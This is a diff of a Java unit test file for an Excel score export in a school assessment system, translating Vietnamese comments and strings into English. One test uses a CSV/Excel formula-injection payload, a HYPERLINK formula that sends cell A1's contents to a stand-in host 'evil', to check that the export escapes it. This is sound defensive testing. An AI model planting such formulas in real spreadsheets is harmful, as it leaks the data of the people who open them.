@@ -43,12 +43,12 @@ import com.sep.vox.application.query.repository.AssessmentGradingQueryRepository
 import com.sep.vox.infrastructure.service.PoiSpreadsheetWriterService;
 
 /**
- * Bản .xlsx bỏ được BOM và quote của CSV, nhưng KHÔNG bỏ được guard công thức: rủi ro nằm
- * ở lúc Excel đọc ô chứ không ở cách file được mã hoá. Lý do tồn tại của bản Excel là các ô
- * có KIỂU thật — nên "điểm là ô số", "thời gian là ô ngày" chính là thứ phải test.
+ * The .xlsx drops the BOM and the quoting of the CSV, but does NOT drop the formula guard: the risk is
+ * in how Excel reads a cell, not in how the file is encoded. The reason the Excel version exists is cells
+ * with a real TYPE -- so "the score is a numeric cell" and "the time is a date cell" are exactly what must be tested.
  *
- * <p>Đọc ngược file bằng POI thay vì so chuỗi: .xlsx là một file zip, so byte không nói
- * được gì về thứ người dùng nhìn thấy.
+ * <p>Read the file back with POI instead of comparing strings: an .xlsx is a zip file, and comparing bytes says
+ * nothing about what the user sees.
  */
 class ExportAssessmentScoresExcelUseCaseTests {
 
@@ -104,13 +104,13 @@ class ExportAssessmentScoresExcelUseCaseTests {
     }
 
     @Test
-    void should_write_the_thirteen_vietnamese_headers_in_order() {
+    void should_write_the_thirteen_english_headers_in_order() {
         Row header = export().getRow(0);
 
         assertThat(header.getLastCellNum()).isEqualTo((short) 13);
         assertThat(cellTexts(header)).containsExactly(
-            "Mã bài", "Họ tên", "Email", "Lớp", "Kỳ thi", "Ca thi", "Điểm", "Xếp loại",
-            "Trạng thái", "Vòng chấm cuối", "Kết luận", "Người chấm", "Thời điểm công bố");
+            "Result code", "Full name", "Email", "Class", "Assessment", "Schedule", "Score", "Result band",
+            "Status", "Last grading round", "Conclusion", "Grader", "Released at");
     }
 
     private List<String> cellTexts(Row row) {
@@ -130,7 +130,7 @@ class ExportAssessmentScoresExcelUseCaseTests {
         assertThat(cell.getNumericCellValue()).isEqualTo(7.5);
     }
 
-    /** Chưa có điểm phải là ô TRỐNG — ghi 0 là biến "chưa chấm" thành "được 0 điểm". */
+    /** No score yet must be an EMPTY cell -- writing 0 turns "not graded" into "scored 0". */
     @Test
     void should_leave_the_score_blank_when_it_is_missing() {
         givenRow("Nguyễn Văn A", null, null);
@@ -164,7 +164,7 @@ class ExportAssessmentScoresExcelUseCaseTests {
     void should_neutralize_a_cell_that_starts_like_a_formula() {
         givenRow("=HYPERLINK(\"http://evil/?x=\"&A1,\"Nhấn vào đây\")", null, null);
 
-        // Dấu nháy đơn phía trước là thứ ngăn Excel CHẠY ô này lúc mở file.
+        // The leading single quote is what stops Excel from RUNNING this cell when the file is opened.
         assertThat(export().getRow(1).getCell(1).getStringCellValue()).startsWith("'=HYPERLINK(");
     }
 
@@ -255,14 +255,14 @@ class ExportAssessmentScoresExcelUseCaseTests {
     void should_require_an_assessment_or_a_schedule_scope() {
         assertThatThrownBy(() -> useCase.execute(ExportAssessmentScoresQuery.scopedTo(null, null, null)))
             .isInstanceOf(IllegalArgumentException.class)
-            .hasMessageContaining("kỳ thi hoặc ca thi");
+            .hasMessageContaining("assessment or schedule");
 
         verify(assessmentGradingQueryRepository, never()).findScoreRows(any());
     }
 
     @Test
     void should_reject_a_caller_without_access_to_the_assessment() {
-        doThrow(new ForbiddenException("BẢO MẬT: Bạn không có quyền thao tác trên bài kiểm tra này."))
+        doThrow(new ForbiddenException("SECURITY: You are not allowed to act on this assessment."))
             .when(assessmentGradingAccessService)
             .authorizeSchoolAdminOrClassTestChair(schoolId, assessmentId, adminId);
 
@@ -292,7 +292,7 @@ class ExportAssessmentScoresExcelUseCaseTests {
             .startsWith("bang-diem-lop-").endsWith(".xlsx");
         assertThat(useCase.exportFileName(AssessmentKind.CENTRALIZED))
             .startsWith("bang-diem-tap-trung-").endsWith(".xlsx");
-        // Tên file đi vào header HTTP: phải là ASCII thuần, không dấu.
+        // The file name goes into an HTTP header: it must be plain ASCII, no diacritics.
         assertThat(useCase.exportFileName(null)).matches("[\\x20-\\x7E]+");
     }
 }
